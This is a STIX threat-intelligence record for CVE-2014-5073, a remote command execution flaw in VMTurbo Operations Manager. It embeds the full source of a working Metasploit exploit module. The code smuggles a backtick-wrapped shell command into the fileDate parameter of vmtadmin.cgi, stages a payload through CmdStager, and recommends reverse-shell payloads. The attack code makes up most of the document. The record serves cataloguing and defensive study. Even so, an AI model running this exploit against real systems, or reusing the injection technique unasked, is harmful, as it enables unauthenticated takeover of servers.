{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--99d9bc8a-b2d0-4d8d-ad5f-34d7024f4465",
    "created": "2024-08-14T17:14:41.411588Z",
    "modified": "2024-08-14T17:14:41.411595Z",
    "name": "VMTurbo Operations Manager vmtadmin.cgi Remote Command Execution",
    "description": " VMTurbo Operations Manager 4.6 and prior are vulnerable to unauthenticated OS Command injection in the web interface. Use reverse payloads for the most reliable results. Since it is a blind OS command injection vulnerability there is no output for the executed command when using the cmd generic payload. Port binding payloads are disregarded due to the restrictive firewall settings.  This module has been tested successfully on VMTurbo Operations Manager versions 4.5 and 4.6. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/vmturbo_vmtadmin_exec_noauth.rb",
            "external_id": "vmturbo_vmtadmin_exec_noauth.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5073"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20140905004331/http://secunia.com:80/secunia_research/2014-8/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'VMTurbo Operations Manager vmtadmin.cgi Remote Command Execution',\n      'Description' => %q{\n          VMTurbo Operations Manager 4.6 and prior are vulnerable to unauthenticated\n          OS Command injection in the web interface. Use reverse payloads for the most\n          reliable results. Since it is a blind OS command injection vulnerability,\n          there is no output for the executed command when using the cmd generic payload.\n          Port binding payloads are disregarded due to the restrictive firewall settings.\n\n          This module has been tested successfully on VMTurbo Operations Manager versions 4.5 and\n          4.6.\n      },\n      'Author'      =>\n        [\n          # Secunia Research - Discovery and Metasploit module\n          'Emilio Pinna <emilio.pinn[at]gmail.com>'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n            ['CVE', '2014-5073'],\n            ['OSVDB', '109572'],\n            ['URL', 'http://web.archive.org/web/20140905004331/http://secunia.com:80/secunia_research/2014-8/']\n        ],\n      'DisclosureDate' => '2014-06-25',\n      'Privileged'     => false,\n      'Platform'       => %w{ linux unix },\n      'Payload'        =>\n        {\n          'Compat'   =>\n          {\n            'ConnectionType' => '-bind'\n          }\n        },\n      'Targets'        =>\n      [\n        [ 'Unix CMD',\n          {\n            'Arch' => ARCH_CMD,\n            'Platform' => 'unix'\n          }\n        ],\n        [ 'VMTurbo Operations Manager',\n          {\n          'Arch' => [ ARCH_X86, ARCH_X64 ],\n          'Platform' => 'linux'\n          }\n        ],\n      ],\n      'DefaultTarget'  => 1\n      ))\n\n    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n  begin\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => \"/cgi-bin/vmtadmin.cgi\",\n      'vars_get' => {\n        \"callType\" => \"ACTION\",\n        \"actionType\" => \"VERSIONS\"\n      }\n    })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Failed to connect to the web server\")\n      return Exploit::CheckCode::Unknown\n  end\n\n  if res and res.code == 200 and res.body =~ /vmtbuild:([\\d]+),vmtrelease:([\\d.]+),vmtbits:[\\d]+,osbits:[\\d]+/\n    version = $2\n    build = $1\n\n    vprint_status(\"VMTurbo Operations Manager version #{version} build #{build} detected\")\n    else\n      vprint_status(\"Unexpected vmtadmin.cgi response\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    # NOTE (@todb): This PHP style comparison seems incorrect, since\n    # strings are being compared and not numbers. Example:\n    # 1.9.3p547 :001 > a = \"4.6\"\n    #  => \"4.6\"\n    # 1.9.3p547 :002 > b = \"10.6\"\n    #  => \"10.6\"\n    # 1.9.3p547 :003 > a <= b\n    #\n    # Also, the description says 4.5 is also vuln. This doesn't\n    # appear to care.\n    if version and version <= \"4.6\" and build < \"28657\"\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def execute_command(cmd, opts)\n    begin\n    res = send_request_cgi({\n      'uri'    => '/cgi-bin/vmtadmin.cgi',\n      'method' => 'GET',\n      'vars_get' => {\n        \"callType\" => \"DOWN\",\n        \"actionType\" => \"CFGBACKUP\",\n        \"fileDate\" => \"\\\"`#{cmd}`\\\"\"\n      }\n    })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Failed to connect to the web server\")\n      return nil\n    end\n\n    vprint_status(\"Sent command #{cmd}\")\n  end\n\n  def exploit\n\n    # Handle single command shot\n    if target.name =~ /CMD/\n      cmd = payload.encoded\n      res = execute_command(cmd, {})\n\n      unless res\n        fail_with(Failure::Unknown, \"#{peer} - Unable to execute payload\")\n      end\n\n      print_status(\"Blind Exploitation - unknown exploitation state\")\n      return\n    end\n\n    # Handle payload upload using CmdStager mixin\n    execute_cmdstager({:flavor => :printf})\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-06-25",
    "x_mitre_platforms": [
        "linux"
    ]
}